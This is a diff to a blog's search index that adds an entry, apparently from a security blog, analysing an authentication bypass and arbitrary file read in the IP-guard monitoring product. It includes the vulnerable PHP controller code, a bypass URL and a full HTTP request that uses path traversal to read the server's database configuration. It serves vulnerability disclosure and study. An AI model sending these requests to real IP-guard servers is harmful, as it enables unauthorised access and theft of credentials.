@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "IP-guard Authentication Bypass",
+    "url": "/posts/ip-guard-auth-bypass/",
+    "categories": "vulnerability, IP-guard",
+    "tags": "",
+    "date": "2024-04-17 12:13:00 +0800",
+    
+
+
+
+
+
+    
+    "snippet": "OverviewIP-guard is an enterprise information supervision system developed by a Chinese company. It is a simple, easy-to-use,and fully functional computer monitoring and control tool that prevents ...",
+    "content": "OverviewIP-guard is an enterprise information supervision system developed by a Chinese company. It is a simple, easy-to-use,and fully functional computer monitoring and control tool that prevents internal documents from being copied byrestricting the use of mobile storage devices and applications. This facilitates enterprise control over the flow ofinformation, effectively safeguards corporate information assets, and records detailed operations, printing, andcorresponding screen recordings to help businesses promptly identify misconduct, minimize losses, and preserve evidence.Before version 4.82.0609.0, the product had a permission bypass vulnerability that allowed unauthorized visitors tobypass permissions and read system files.Technical AnalysisAuthentication BypassIP-guard is a web application based on CodeIgniter, a PHP framework. The application uses the following URL format:http://example.com/index.php/controller/method/param1/param2/...Upon reviewing the source code, we discovered that within the mApplyList controller, the system retrieves the method name of the request through the $func variable and then checks whether the user is logged in. If the user is not logged in, it should redirect to the login page. However, when the requested method name is getdatarecord, the system returns the error code ErrorCode::OERR_NOT_LOGIN and terminates further execution, but it fails to redirect to the login page. This process clearly has a vulnerability, as it does not guide unauthenticated users to verify their identity as expected.The source code of the mApplyList controller is as follows:&lt;?phpclass mApplyList extends CI_Controller{    // --- snip ---    public function __construct()    {        parent::__construct();        // --- snip ---        $func = substr(strrchr(rtrim($arrURL['path'], '/'), '/'), 1);        $func = strtolower($func);        if (!isset($this-&gt;logID) || empty($this-&gt;logID) ||            !isset($this-&gt;language) || empty($this-&gt;language) ||            !isset($this-&gt;SuName) || empty($this-&gt;SuName)) {            if ($func != 'download') {                if ($func == 'getdatarecord') {                    $this-&gt;errorresult(ErrorCode::OERR_NOT_LOGIN);                    return;                }                redirect(\"appr/SignIn\");                return;            }             // --- snip ---        }    }}So, an attacker can bypass authentication by sending a request like the following to access the changepwd method.http://192.168.32.186:8080/ipg/appr/MApplyList/changepwd/getdatarecordFile ReadThe downloadFile_client method in the mApplyList controller is responsible for downloading files. The method retrieves the file path from the request and then reads the file content. However, the system does not properly validate the file path, allowing an attacker to read arbitrary files on the server.POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1Host: 192.168.32.186:8080User-Agent: Mozilla/5.0 (Linux; Android 4.0.4) AppleWebKit/531.1 (KHTML, like Gecko) Chrome/22.0.889.0 Safari/531.1Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveContent-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1Content-Length: 88path=..%2Fapplication%2F/config/database.php&amp;filename=1&amp;action=download&amp;hidGuid=1v%0D%0APatch AnalysisIn version 4.82.0609.0 of IP-guard, the privilege bypass vulnerability has not been addressed, but the file reading vulnerability has been fixed. In the mApplyList controller, the downloadFile_client method has been modified to include validation of file paths, allowing only files from specified directories to be downloaded.Authentication bypass vulnerability still exists.Reference  https://mp.weixin.qq.com/s/PWiGtoHea-ZBaYTR5FwxLQ  https://codeigniter.org.cn/userguide3/general/routing.html"
+  },
+  
+  {
     "title": "CVE-2024-21650 XWiki RCE",
     "url": "/posts/CVE-2024-21650/",
     "categories": "vulnerability, XWiki",
